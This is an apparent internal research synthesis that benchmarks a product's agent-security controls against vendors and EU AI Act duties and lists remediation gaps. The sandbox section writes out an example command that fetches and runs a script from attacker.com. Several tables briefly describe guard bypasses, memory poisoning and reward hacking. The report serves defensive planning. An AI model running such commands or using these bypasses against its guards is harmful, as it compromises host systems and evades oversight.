# WS-7: Synthesis & Competitive Strategy - Cross-Cutting Analysis

> **Part of the Agentic Guardrails, Compliance, Standardisation & Security research programme**
> Status: **COMPLETE** | Last updated: 2026-05-25
> Cross-cuts: WS-1 (FAANG - 601 lines), WS-2 (SME/Startup - 1100 lines), WS-3 (Neocloud - 896 lines), WS-4 (Regulatory - 711 lines), WS-5 (Academic - 769 lines, 84 papers), WS-6 (Incidents - 358 lines)

---

## Section 1: Executive Summary

### 1.1 The Research in One Page

This synthesis cross-cuts six research workstreams spanning 4,435+ lines of analysis, 84 academic papers, 25+ real-world incidents, 7 FAANG vendors, 15+ startup products, 12 neocloud providers, and 5 major regulatory frameworks. The investigation reveals five structural realities that define the agentic AI security landscape in mid-2026:

**Reality 1: No end-to-end solution exists.** The market is fragmented across five layers - guardrails (NeMo, Guardrails AI), orchestration (LangChain, Semantic Kernel, CrewAI), observability (Arize, Galileo, WhyLabs), security (Lakera, Protect AI, Prompt Security), and compliance (Purview, AWS Artifact). FAANG vendors provide powerful but platform-locked guardrails (Google Model Armor, AWS Bedrock Guardrails, Microsoft Purview). No single product spans prompt injection defence, runtime policy enforcement, audit logging, multi-agent security, and compliance certification. Enterprises must integrate 3-5 tools, creating integration complexity that AMI could eliminate.

**Reality 2: The threat landscape has escalated beyond current defences.** Prompt injections surged 340% YoY (OWASP Apr 2026), present in 73% of production deployments. Memory poisoning enables cross-session persistent compromise - MINJA achieves 95%+ injection success rate with only query access. The MCP ecosystem has 200K+ vulnerable instances with worm-capable malware (Shai-Hulud, TanStack with valid SLSA Level 3 attestations). Adaptive attacks bypass ALL current indirect prompt injection defences (arXiv 2503.0061). The theoretical result that prompt injection may be structurally inescapable (arXiv 2605.17634) means containment - not prevention - must be the architectural principle. The PocketOS incident (Apr 2026) - an agent deleting a production database in 9 seconds - is the canonical failure mode that every enterprise agent deployment risks.

**Reality 3: Regulatory deadlines are imminent and carry existential penalties.** The EU AI Act's high-risk provisions (Art. 12 logging, Art. 14 human oversight, Art. 26 deployer duties) take full effect 2 August 2026 - approximately 10 weeks from today. Penalties reach 15M EUR or 3% of turnover for Art. 12-26 violations, and 35M EUR or 7% for prohibited practices. ISO 42001 certification is available but no AMI-affiliated system holds it. NIST's AI Agent Test Suite arrives Q4 2026. The UK's DUAA diverges from EU on automated decision-making (permission-with-safeguards vs structured oversight), creating cross-border compliance complexity. The Schufa decision (ECJ Dec 2024) and AMS Austria case (2025) establish rigorous standards for "meaningful human intervention" - cursory review is legally insufficient.

**Reality 4: The neocloud layer is mature enough for enterprise agent workloads but offers no agent-specific security.** CoreWeave offers bare metal + DPU isolation, SOC 2 + ISO 27001 + HIPAA, multi-region EU data centres (UK, Sweden, Norway, Spain), and NVIDIA Confidential Computing. Fireworks AI uniquely holds ISO 42001 for AI management systems. Modal and Beam provide gVisor sandboxing for untrusted code execution. But no neocloud offers agent-specific infrastructure - no agent identity, no inter-agent policies, no agent sandboxing primitives, no safety filter APIs. The neoclouds provide the substrate; AMI can provide the agent security layer that runs on that substrate.

**Reality 5: Academic research has converged on a coherent architectural vision that no product yet implements.** The literature across 84 papers at top venues (NeurIPS, ICML, AAAI, USENIX Security, IEEE S&P, ACM CCS) converges on five architectural layers: (1) semantic virtualization treating the LLM as an untrusted Guest mediated by a trusted Visor (AgentVisor, arXiv 2604.24118), (2) formal runtime verification with DSL-based enforcement (AgentSpec ICSE 2026, ShieldAgent ICML 2025, AGENT-C NeurIPS 2025), (3) memory integrity with cryptographic verification and trust scoring (AgentSafe arXiv 2503.04392, AgentCrypt ePrint 2025/2216), (4) hardware-grounded isolation via Confidential Containers and seL4 microkernel (Omega arXiv 2512.05951, agentOS on seL4), and (5) defence-in-depth against prompt injection including structured query protocols (StruQ USENIX Security 2025). No existing system combines all five layers. AMI's proposed architecture maps precisely to this research consensus.

### 1.2 The Single Most Important Strategic Implication

**AMI-Agents' current architecture - fail-closed hook pipeline, command-tier policy engine, binary-level git/podman guards, session audit logging - is the right foundation but faces a 12-18 month execution gap to match where the market and regulatory environment will be by mid-2027.**

The critical gap is not feature count but architectural maturity:

| Capability | Current State | Required State | Gap Duration |
|---|---|---|---|
| Runtime guardrails | Command-level hooks only | Tool-call-level + LLM I/O + inter-agent | ~18 months |
| Agent isolation | SUID binary guards (git, podman) | gVisor + Kata/Firecracker + TEE | ~12 months |
| Compliance evidence | Aspirational docs | ISO 27001 + ISO 42001 certified | ~12 months |
| Multi-agent | Single-agent sessions | A2A + orchestration + security | ~12 months |
| Prompt injection defence | None (hard deny patterns only) | Semantic virtualization + classifiers | ~9 months |
| Observability | Session transcripts | OTEL + drift detection + SIEM | ~9 months |
| Memory | Ephemeral session state | Integrity-verified persistent memory | ~15 months |

**The single most important strategic decision is: ship ISO 27001 certification by Q1 2027 and ISO 42001 by Q3 2027 as the compliance wedge, while simultaneously building the semantic-virtualization-based agent security layer that no FAANG vendor or startup offers as a standalone product.**

This positions AMI not as "another agent framework" competing with LangChain or AutoGen, but as the compliance-and-security layer that enterprises run UNDER their agent frameworks - a sovereign, certifiable trust platform for agentic AI that works with any LLM, any framework, and any infrastructure.

---

## Section 2: Comparative Matrix

### 2.1 Methodology

This matrix compares AMI-Agents' current codebase-verified state against the best-in-class across three competitive sets:
- **FAANG** (Google/DeepMind, Microsoft, Amazon/AWS, Meta, Apple, OpenAI, Anthropic) - sourced from WS-1
- **Startup Ecosystem** (Guardrails AI, NeMo Guardrails, LangChain/LangGraph, Semantic Kernel, CrewAI, AutoGen, Arize Phoenix, Galileo, Lakera, Protect AI, etc.) - sourced from WS-2
- **Neocloud** (CoreWeave, Lambda Labs, Fireworks AI, Modal, Beam, etc.) - sourced from WS-3

AMI's current state is anchored to specific codebase files:
- `ami/core/policies/engine.py` - YAML policy loading (165 lines)
- `projects/WORKSPACE-GUARD/` - SUID binary hardening, agent sandbox escape research
- `docs/specifications/SPEC-HOOKS.md` - Hook validation pipeline v4.0.0 + Phase 2 design
- `projects/docs/WORKSPACE-VM-OVERVIEW.md` - Enterprise compliance posture
- `README.md` - "federated, hard-walled infrastructure"

### 2.2 Dimension-by-Dimension Comparison

#### 2.2.1 Agent Isolation Technology

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Confidential VMs + Model Armor; Apple: PCC with verifiable transparency (stateless, no SSH, Secure Boot); OpenAI: SandboxAgent (beta Apr 2026, isolated Linux envs with manifest contracts); Anthropic: Managed Agents API with `limited` networking mode | NeMo Guardrails: Colang-based dialog/tool rails; Semantic Kernel: 3 filter types (function, prompt, auto-invocation); Galileo: Agent Control open-source (early) | CoreWeave: DPU-level bare metal isolation, single-tenant nodes, Kata Containers, NVIDIA CC GPU TEE; Fireworks: BYOC/airgapped (AWS EKS, no metadata sent); Modal: gVisor sandbox (userspace kernel, no host kernel syscalls) | Fail-closed command hooks; SUID binary guards (git-guard, podman-guard); no agent-level sandboxing; no gVisor/Kata/Firecracker integration; no container isolation for agent code | **CRITICAL** - No sandboxed execution environment for LLM-generated code. AMI agents run with host-level privileges. No TEE/Confidential Computing integration. No process-level isolation between agent and host. The PocketOS pattern (agent deletes production DB) is fully replicable in current AMI. |
| Code path | N/A | N/A | N/A | `projects/WORKSPACE-GUARD/` provides binary-level git isolation but not runtime sandboxing. `ami/core/guards.py` provides command classification but no execution sandbox. | New module: `ami/core/runtime/sandbox.py` - gVisor wrapper for agent code execution. New file: `ami/core/agents/manifest.py` - workspace contract (read-only by default, explicit grants). |

#### 2.2.2 Policy Enforcement (Command Tiers, Tool Restrictions)

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Agent Gateway (central policy enforcement) + Agent Identity (cryptographic IAM per agent); AWS: Bedrock Guardrails (content filters, denied topics, PII, contextual grounding); Anthropic: permission policies per tool (`always_allow`, `always_ask`, block) | NeMo Guardrails: tool rails with input/output validation; Semantic Kernel: Auto Function Invocation Filters (control AI auto-invocation); Guardrails AI: Input/Output guards only (no tool-call level) | CoreWeave: IAM RBAC + SPIFFE/SPIRE workload identity; RunPod: Global Networking private inter-pod; All: VPC-level restrictions | Command-tier system: 4 tiers (observe/modify/execute/admin), 21 hard deny rules, scope overrides via RunContext. YAML policy engine (`ami/core/policies/engine.py`, 165 lines). No tool-call-level enforcement. | **HIGH** - No tool-call-level policy enforcement. The command tier operates at shell level only - an LLM that calls `rm -rf /` via Python's `os.system()` bypasses the command tier entirely. No tool schema validation, no parameter bounds checking, no inter-agent policy propagation. |
| Code path | N/A | N/A | N/A | `ami/core/policies/engine.py`: PolicyEngine loads YAML patterns; `ami/core/policies/tiers.py`: TierClassifier with CommandTier enum; `ami/config/policies/command_tiers.yaml`: 4 tiers + 21 hard deny patterns | New module: `ami/core/agents/tools/validator.py` - tool-call interception pipeline. New file: `ami/core/agents/tools/registry.py` - tool schema registry. Extend `HookManager` to support tool-call events (`PRE_TOOL_CALL`, `POST_TOOL_CALL`). |

#### 2.2.3 Audit Logging & Provenance

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Cloud Audit Logs + Model Armor logging + SCC dashboard; Apple: PCC transparency log (every production build publicly logged, devices verify node certs); OpenAI: OpenTelemetry export + Compliance API for Enterprise; Microsoft: Purview unified audit logs | Arize Phoenix: OTEL-native + OpenInference MCP tracing; Galileo: Agent Control audit; LangSmith: LLM tracing (proprietary SaaS) | CoreWeave: immutable Loki/Kafka pipelines, SIEM Telemetry Relay, Falco/Cilium Tetragon; Lambda: immutable logs with 1+ year retention | UUID-keyed session transcripts; replay/search via `ami-transcripts`; HookManager event logging to local files. Transcripts are mutable local files (no integrity protection). No retention policy. No SIEM export. | **CRITICAL** - No immutable audit trail. Current transcripts are human-readable local files that can be modified or deleted. EU AI Act Art. 12 requires "automatic recording of events over the lifetime of the system" with 6-month minimum retention. No compliance log format. No export pipeline. |
| Code path | N/A | N/A | N/A | `ami/core/session/`: Session store with UUID transcripts. HookManager dispatches events but logs are flat files, not an append-only structure. | New module: `ami/core/audit/log.py` - hash-chain audit trail (Blake3 chain, append-only, integrity verify). New file: `ami/core/audit/exporters.py` - SIEM export (syslog RFC 5424, Kafka, CloudWatch). 6-month retention with rotation. |

#### 2.2.4 Human-in-the-Loop Patterns

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: User Alignment Critic (separate Gemini model vets every action); Anthropic: Plan Mode + `always_ask` per tool default; OpenAI: tool-level `needsApproval` flag with state-preserving interruptions; AWS: Detect mode for pre-validation | Semantic Kernel: Function Invocation Filters enabling HITL; AutoGen: UserProxyAgent + HandoffTermination; LangGraph: built-in interruption/approval nodes | N/A (infra layer) | CONFIRM action for modify/execute command tiers; hard deny unconditional. No LLM-based review. No stop button. No override/reverse capability. No two-person rule for sensitive operations. | **CRITICAL** - No Art. 14(4)(e) stop button mechanism. Art. 14(4)(d) override/reverse capability absent. Current CONFIRM is pre-execution only - no post-execution reversal. No support for Art. 14(5) two-person rule for biometric/critical systems. No automation bias mitigation. |
| Code path | N/A | N/A | N/A | `ami/hooks/types.py`: HookResult with `allowed`, `needs_confirmation`. SPEC-HOOKS.md Phase 2 design includes LLM validators but not implemented. | New file: `ami/core/agents/interrupt.py` - interrupt handling, safe halt, state checkpoint. New file: `ami/core/agents/reversal.py` - action reversal with inverse action mapping. |

#### 2.2.5 Compliance Certifications Held

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Portfolio | Microsoft: ISO 27001, SOC 2, HIPAA, FedRAMP High/Moderate, PCI DSS; Google: ISO 42001 commitment, SecNumCloud 3.2, ISO 27017/27018; Apple: ISO 27001/27018; AWS: SOC 1/2/3, ISO 27001/27017/27018, HIPAA BAA, FedRAMP, PCI DSS | Mistral: ISO 27001:2022, ISO 27701:2019, SOC 2 Type I/II; Aleph Alpha: ISO 27001; Lakera: SOC 2 Type II; Arize: SOC 2 Type II | Fireworks: SOC 2, ISO 27001, ISO 27701, ISO 42001, HIPAA; CoreWeave: SOC 2, ISO 27001, ISO 27017/27018, HIPAA (ISO 42001 in progress); Lambda: SOC 2, ISO 27001, PCI DSS Level 1, HIPAA, HITRUST | Zero certifications held. WORKSPACE-VM-OVERVIEW.md references ISO 42001 and NIST AI RMF as targets but no certification engagement exists. No audit evidence packages. No certification body contact. | **CRITICAL** - Zero certifications. This is the single biggest enterprise procurement blocker. Every competitor in the matrix above holds at least SOC 2 or ISO 27001. AMI cannot be purchased by regulated EU enterprises without at minimum SOC 2 Type II. |

#### 2.2.6 EU Data Sovereignty

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Assured Workloads EU Data Boundary (12+ EU zones, ML processing within region, SecNumCloud 3.2); Apple: on-device processing eliminates data transfer; Microsoft: data residency controls, EU regions | Mistral: EU-hosted by default (US endpoint opt-in); Aleph Alpha: alpha ONE datacenter Germany (7.625 petaflops); Deepset: self-hostable; Lakera: Swiss HQ/GDPR | CoreWeave: 8+ EU AZs (UK, SE, NO, ES), 100% renewable, 2.2B EUR EU expansion; Scaleway: SecNumCloud France; Hetzner: German jurisdiction ISO 27001 + C5; OVHcloud: 19 DCs across 12 countries | Local-first architecture by design. No SaaS control plane. Model-agnostic (no provider lock-in). Bootstraps from user network. Dependencies install into `.boot-linux/` directory. Strong sovereignty story but undocumented and unverifiable by third parties. | **MEDIUM** - Strong architectural sovereignty but no formal EU data boundary documentation. No DPA templates for deployers. No data flow diagrams covering subprocessors. No GDPR Article 28 DPA for model providers. Cannot prove "data never leaves EU" to an auditor. |

#### 2.2.7 Prompt Injection Defence

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Model Armor jailbreak detection + Gemini-as-Filter (5-layer stack); Meta: Prompt Guard 2 (86M + 22M BERT classifiers) + AlignmentCheck (CoT auditor); Anthropic: Constitutional Classifiers++ (two-stage cascade, 95%+ jailbreak blocked, 0.05% over-refusal); Apple: instruction hierarchy (system > user prompt) | Lakera Guard: 95.22% PINT (top score), sub-12ms latency; NeMo Guardrails: Jailbreak Detection NIM (17K known jailbreaks); Guardrails AI: no agent-specific guardrails | N/A - no safety filters at infrastructure layer. Together AI: "models run as author published" - no forced filtering. Fireworks ISO 42001: responsible AI managed but no detection API. | No prompt injection detection whatsoever. 21 hard deny patterns at shell level (e.g., blocks `--no-verify`, blocks dangerous `-c` config keys for git) but these operate at the command syntax level, not the LLM I/O level. An LLM instructed to execute SQL injection or exfiltrate data via curl would pass all current guards. | **CRITICAL** - No LLM-level prompt injection detection. No content filter for agent inputs or outputs. No jailbreak classifier. No structured query protocol. No semantic virtualization. The research consensus (arXiv 2605.17634, arXiv 2503.0061) shows heuristic prevention is structurally insufficient - containment, not detection, must be the primary defence. |

#### 2.2.8 Tool-Use Restrictions

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Agent Gateway (IAM per agent) + read-only vs read-writable origin sets; Apple: App Intents framework (schema-declared actions, no code generation, pre-approved by App Store reviewers); Anthropic: permission policies (`always_allow`, `always_ask`, block) per tool; OpenAI: tool guardrails + `tool_choice`/`parallel_tool_calls` control | NeMo Guardrails: tool rails with parameter validation; Semantic Kernel: Auto Function Invocation Filters; AgentBound: MCP access control framework (Android-inspired permission model, 80.9% auto-policy accuracy) | All: RBAC, SSO, MFA, API key authentication, VPC controls. CoreWeave: SPIFFE/SPIRE workload identity. None offer agent-specific tool restriction APIs. | No tool-use restriction framework exists. Command-tier is shell-level - it controls what shell commands the agent can run but not what LLM tool calls (function calls) the agent can make. No tool schema validation, no parameter bounds checking, no tool-scoped permissions. | **CRITICAL** - No tool invocation interception. The "excessive agency" (OWASP LLM06) pattern - giving agents broad tools and broad authority without scope isolation - is the root cause of every major agent incident (PocketOS, Kiro, Claude Code loop). AMI is fully exposed. |
| Code path | N/A | N/A | N/A | `ami/config/policies/command_tiers.yaml`: Tier definitions for shell commands. No equivalent for LLM tool calls. | New module: `ami/core/agents/tools/` - complete tool management system. Files: `registry.py` (tool schema registry), `validator.py` (interception pipeline), `permissions.py` (allow/deny/confirm per tool per agent). New event types in HookManager: `PRE_TOOL_CALL`, `POST_TOOL_CALL`. |

#### 2.2.9 Agent-to-Agent Security

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: A2A protocol (v1.0, Agent Card, task-oriented); Anthropic: multi-agent handoff checks at both delegation and return; Microsoft: Agent 365 control plane + Agent Governance Toolkit (Ed25519 identity, trust scoring 0-1000) | Microsoft Agent Governance Toolkit: agentmesh (Ed25519, trust-gated tools, hash-chained audit); Galileo: Agent Control open-source (early stage, Mar 2026) | N/A (infra layer - no multi-agent primitives) | Single-agent sessions only. No A2A protocol support. No multi-agent topology. No inter-agent communication. No agent identity system. No trust model. | **CRITICAL** - No multi-agent capability at all. This is the widest gap against the market. Every FAANG and major startup has multi-agent orchestration. AMI is still single-agent. A2A v1.0 has zero built-in PI defences (Grith Security, 2026) - AMI has opportunity to build the first secured A2A implementation. |

#### 2.2.10 Observability & Monitoring

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: SCC dashboards + Model Armor monitoring + Cloud Audit Logs; Microsoft: Purview AI Hub (centralized governance, DSPM, Insider Risk Management); AWS: CloudWatch + Bedrock Agent trace logging | Arize Phoenix: OTEL-native agent traces + AgentEvals + MCP tracing; Galileo: purpose-built agent metrics (tool selection quality, action advancement, agent flow) + Luna-2 small models for 100% traffic eval | CoreWeave: Loki/Grafana/VictoriaMetrics + Falco/Cilium Tetragon runtime security; Lambda: immutable logs + anomaly detection + continuous vulnerability scanning | UUID-keyed session transcripts only. No metrics, no dashboards, no drift detection, no anomaly alerting. No integration with external monitoring stacks. No performance visibility. | **HIGH** - No agent behaviour monitoring. Cannot detect anomalous action sequences, tool use drift, or performance degradation. No SIEM integration - enterprise security teams cannot ingest AMI events. No pre-production evaluation pipeline for agent behaviour quality. |

#### 2.2.11 Sandbox/Container Security

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | OpenAI: SandboxAgent (beta Apr 2026 - manifest-based workspace contracts); Google: gVisor for Cloud Run; AWS: Firecracker microVMs (125ms boot, ~5MB memory, KVM-based, zero known VM escape CVEs) | Modal: gVisor sandbox (SOC 2, HIPAA, 100x faster than VMs); Beam: gVisor (open-source AGPL-3.0, self-hostable) | CoreWeave: DPU-enforced isolation + Kata Containers option; NVIDIA: Confidential Containers (Kata + TDX/SEV-SNP + H100 CC); Fireworks: BYOC airgapped (no metadata sent) | git-guard and podman-guard binary wrappers - compiled SUID-root enforcement for git ops and container management. No sandboxed execution environment for agent-generated code. No container isolation for agent runtime. No GPU sandboxing. | **CRITICAL** - No code execution sandboxing. An LLM that generates `os.system("curl attacker.com/malware.sh | bash")` executes with full host privileges. WORKSPACE-GUARD RESEARCH.md documents gVisor, Firecracker, and Kata as recommendations - none are implemented. |

#### 2.2.12 Runtime Guardrail Enforcement

| Detail | FAANG Best | Startup Best | Neocloud Best | AMI Current | AMI Gap |
|---|---|---|---|---|---|
| Approach | Google: Model Armor real-time I/O filtering (floor settings, org-level minimum thresholds); AWS: Bedrock Guardrails per agent (content, PII, contextual grounding, automated reasoning); Anthropic: Constitutional Classifiers++ runtime cascade (~1% compute overhead) | Lakera: real-time threat detection API (sub-12ms); Galileo: real-time protection (early stage); NeMo Guardrails: NIM microservices (sub-50ms); Semantic Kernel: filter middleware at runtime | CoreWeave: runtime security via Falco/Cilium Tetragon; Modal: gVisor runtime process isolation; Fireworks: real-time monitoring at infra level | HookManager v4.0.0 validators at 3 events: PRE_BASH, PRE_EDIT, POST_OUTPUT. Phase 2 (LLM validators, MODIFY/FEEDBACK actions, security loadouts) designed in SPEC-HOOKS.md but not implemented. | **CRITICAL** - Runtime guardrails exist only at shell/editor boundaries, not at LLM I/O or tool-call boundaries. No real-time content filtering. No hallucination detection. No contextual grounding. No prompt injection monitoring during agent execution. |

### 2.3 Competitive Comparison Summary Scores

| Dimension | FAANG (avg) | Startup (avg) | Neocloud (avg) | AMI-Agents |
|---|---|---|---|---|
| Agent isolation | 4.5/5 | 2.5/5 | 4.0/5 | 1.5/5 |
| Policy enforcement | 4.5/5 | 3.0/5 | 2.5/5 | 2.5/5 |
| Audit logging | 4.5/5 | 2.5/5 | 3.5/5 | 2.0/5 |
| Human-in-the-loop | 4.0/5 | 2.5/5 | 1.0/5 | 1.5/5 |
| Compliance certs | 5.0/5 | 2.5/5 | 3.5/5 | 0.0/5 |
| EU sovereignty | 4.0/5 | 3.0/5 | 4.0/5 | 4.0/5 |
| Prompt injection defence | 4.5/5 | 3.5/5 | 0.0/5 | 0.0/5 |
| Tool-use restrictions | 4.5/5 | 3.0/5 | 0.0/5 | 0.0/5 |
| Agent-to-agent security | 3.0/5 | 1.5/5 | 0.0/5 | 0.0/5 |
| Observability | 4.5/5 | 3.5/5 | 3.0/5 | 1.0/5 |
| Sandbox security | 4.0/5 | 2.5/5 | 4.0/5 | 1.5/5 |
| Runtime guardrails | 4.5/5 | 3.0/5 | 1.0/5 | 1.0/5 |
| **Average** | **4.3/5** | **2.7/5** | **2.2/5** | **1.3/5** |

AMI leads only in EU sovereignty (tied with neoclouds) - every other dimension has significant gaps. The compliance certifications gap (0.0 vs 5.0 for FAANG) is the most critical single weakness.

---

## Section 3: Gap Analysis

### 3.1 Certification Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
| **CERT-1** | Zero compliance certifications held. AMI documents target ISO 42001 and NIST AI RMF (WORKSPACE-VM-OVERVIEW.md) but holds no ISO 27001, SOC 2, or ISO 42001 certification. No audit engagement with any certification body. | Critical | WS-4 (§4), WS-2 (§2.5: Mistral ISO 27001) | **P0 - Immediate** | Initiate ISO 27001 certification engagement with BSI/SGS/TUV in Q3 2026. Target certification by Q1 2027. ISO 27001 is prerequisite for ISO 42001. Budget: 25-50K EUR for Stage 1 + Stage 2 audits. Parallel SOC 2 Type I by Q4 2026. |
| **CERT-2** | No EU AI Act conformity assessment documentation. No Art. 6(3) non-high-risk determinations documented for any agent use case. No EU database registration. The Aug 2026 deadline is 10 weeks away. | Critical | WS-4 (§3.1.4) | **P0 - Immediate** | Classify all intended agent use cases against Annex III categories (especially 3-5: education, employment, essential services). Document Art. 6(3) derogation analysis. Register high-risk systems in EU database before 2 Aug 2026. |
| **CERT-3** | No AIMS per ISO 42001 Clauses 4-10. No AI policy, no AI risk assessment, no AI system impact assessment procedure, no documented information control, no operational planning, no monitoring procedures. | High | WS-4 (§3.2) | **P1 - Q1 2027** | Develop AIMS documentation: AI policy, AI risk assessment methodology, AI system impact assessment template, documented information procedure, operational planning procedure. |
| **CERT-4** | No OWASP LLM Top 10 mitigation mapping. AMI has some implicit coverage but no systematic mapping. No residual risk register for unmitigated entries (LLM01 prompt injection, LLM07 insecure plugin design). | High | WS-4 (§3.4) | **P1 - Q4 2026** | Map AMI controls against OWASP LLM Top 10 v2025 and OWASP Agentic Top 10 (Dec 2025). Create risk register for entries exceeding acceptable tolerance. |
| **CERT-5** | No CEN-CENELEC harmonised standards monitoring. First harmonised standards expected late 2026-early 2027. | Medium | WS-4 (§3.4.3) | **P2 - 2027** | Assign standards monitoring responsibility. Cross-reference published standards against AMI controls when available. |

### 3.2 Agent-Specific Security Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
| **AGENT-1** | No agent-level sandboxing. AMI commands run directly on host OS. No gVisor, Kata, Firecracker, or container isolation for LLM-generated code execution. WORKSPACE-GUARD RESEARCH.md documents need for gVisor/Firecracker but has zero implementation. | Critical | WS-1 (OpenAI SandboxAgent), WS-3 (Modal gVisor, CoreWeave DPU/Kata), WS-5 (§2.3: Omega, seL4, Firecracker) | **P0 - Immediate** | Integrate gVisor sandboxing for agent code execution (reference: Modal/Beam, gVisor GPU nvproxy). Create `ami-sandbox` runtime that wraps execution. Network blocked by default. Workspace read-only by default. Explicit grants for write/network. |
| **AGENT-2** | No tool-use restriction framework. AMI's command-tier controls shell commands but has no mechanism to intercept, validate, or restrict LLM tool calls. The excessive agency (OWASP LLM06) pattern is unmitigated. | Critical | WS-1 (Google Agent Identity, Anthropic permissions, OpenAI tool guardrails), WS-2 (NeMo tool rails, Semantic Kernel filters), WS-5 (§2.3: AgentBound) | **P0 - Immediate** | Build tool-call interception pipeline: schema validation, parameter bounds, permission check, output taint. Reference: AgentBound (arXiv 2510.21236). Create `ami/core/agents/tools/validator.py`. |
| **AGENT-3** | No prompt injection detection. No content filter for LLM inputs/outputs. No jailbreak classifier, no injection detector, no structured query protocol. 21 hard deny patterns operate at shell syntax level, not LLM I/O level. | Critical | WS-1 (Meta Prompt Guard 2, Google Model Armor, Anthropic Constitutional Classifiers), WS-2 (Lakera 95.22% PINT), WS-5 (§2.2: 23 papers on prompt injection) | **P0 - Immediate** | Two-layer defence: (1) Semantic virtualization (Guest/Visor split per AgentVisor arXiv 2604.24118), (2) Prompt injection classifier (Lakera Guard API or local Prompt Guard 2). Create `ami/core/security/visor.py` and `ami/core/security/injection_detector.py`. |
| **AGENT-4** | No agent-to-agent security. Single-agent sessions only. No A2A protocol, no inter-agent trust model, no agent identity system. A2A v1.0 has zero built-in PI defences (Grith Security, 2026). | Critical | WS-1 (Anthropic handoff, Google A2A), WS-5 (§2.4: papers 58-65), WS-6 (§5.1) | **P1 - Q4 2026** | Implement A2A with mandatory security: Agent Card signing (Ed25519), session integrity, ephemeral scoped tokens (arXiv 2505.12490), semantic firewalls. Create `ami/core/a2a/`. |
| **AGENT-5** | No memory integrity layer. When memory is added, it will be vulnerable to 7+ memory poisoning attack vectors: MINJA (95%+ injection), Zombie Agent (cross-session), eTAMP (environment-injected), Sleeper Poisoning (delayed activation), AGENTPOISON (90%+ ASR). | High | WS-5 (§2.2: memory poisoning papers 33-40) | **P1 - Q1 2027** | Design memory with cryptographic integrity from day one. Hierarchical memory with trust scoring and temporal decay (AgentSafe arXiv 2503.04392). AgentCrypt three-level cryptographic framework for sensitive data. |
| **AGENT-6** | No reward hacking detection. RL post-training increases exploit rates from 0.6% to 13.9% (arXiv 2605.02964). Terminal Wrench dataset (3,632 hack trajectories) provides real training data. | Medium | WS-5 (§2.1: reward hacking papers 1-9) | **P2 - Q2 2027** | Implement evaluation integrity: isomorphic perturbation testing (arXiv 2604.15149), evaluator locking (arXiv 2603.11337), hack-verifiable environments (arXiv 2605.20744). |

### 3.3 EU Regulatory Compliance Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
| **REG-1** | No Art. 12 automatic logging compliance. Transcripts are mutable, not generated for all lifecycle events, have no retention policy (Art. 26(6) requires 6 months), cannot prove integrity to an auditor. | Critical | WS-4 (§3.1.1) | **P0 - Immediate** | Append-only hash-chain audit log (Blake3 per entry). Log every: tool call, model output, state transition, human override, error. Enforce 6-month configurable retention. Create `ami/core/audit/log.py`. |
| **REG-2** | No Art. 14(4)(e) stop button. Ctrl+C kills the process without graceful shutdown, state checkpoint, or tool-rollback. This is a legal requirement for high-risk systems. | Critical | WS-4 (§3.1.2) | **P0 - Immediate** | SIGINT at every yield point in ReAct loop. Sequence: cancel tool calls with resource release, save checkpoint, release locked resources, return to safe state. Create `ami/core/agents/interrupt.py`. |
| **REG-3** | No Art. 14(4)(d) override/reverse capability. CONFIRM provides pre-execution approval but not post-execution reversal. No mechanism to undo, rollback, or compensate. | Critical | WS-4 (§3.1.2) | **P0 - Immediate** | Action reversal framework: every logged action has inverse action. Reversal workflow in TUI with step-by-step undo. File operations: snapshot before modification. API calls: compensation action per tool. Create `ami/core/agents/reversal.py`. |
| **REG-4** | No Art. 26 deployer compliance toolkit. No log retention configuration (Art. 26(6)), no worker notification template (Art. 26(7)), no suspension protocol (Art. 26(5)), no DPA templates, no input data quality procedures. | Critical | WS-4 (§3.1.3) | **P0 - Immediate** | Create deployer package: log retention (6-month default), worker notification template, suspension protocol, DPA with EU SCCs, data quality checklist. Document in `docs/compliance/DEPLOYER-TOOLKIT.md`. |
| **REG-5** | No GDPR Art. 22 compliance. No documentation of whether agent decisions are "solely automated." Schufa (ECJ 2024) and AMS Austria (2025) require active, informed, independent human review. | High | WS-4 (§3.5.3), WS-6 (§7.1) | **P0 - Immediate** | Document Art. 22 analysis per use case. Implement human review pathway for decisions affecting legal rights. Create `docs/compliance/GDPR-ART22.md`. |
| **REG-6** | No DORA/NIS2 preparedness. No ICT risk classification, no incident reporting pipeline (24h/72h/1 month timelines), no third-party risk management for model providers. | Medium | WS-4 (§3.5.1, §3.5.2) | **P2 - Q2 2027** | Incident classification aligned with DORA Art. 17-23. Reporting templates. Model provider due diligence process. Document in `docs/compliance/DORA-NIS2-READINESS.md`. |

### 3.4 Neocloud Integration Gaps

| Gap ID | Gap Description | Severity | Source WS | Priority | Concrete Recommendation |
|---|---|---|---|---|---|
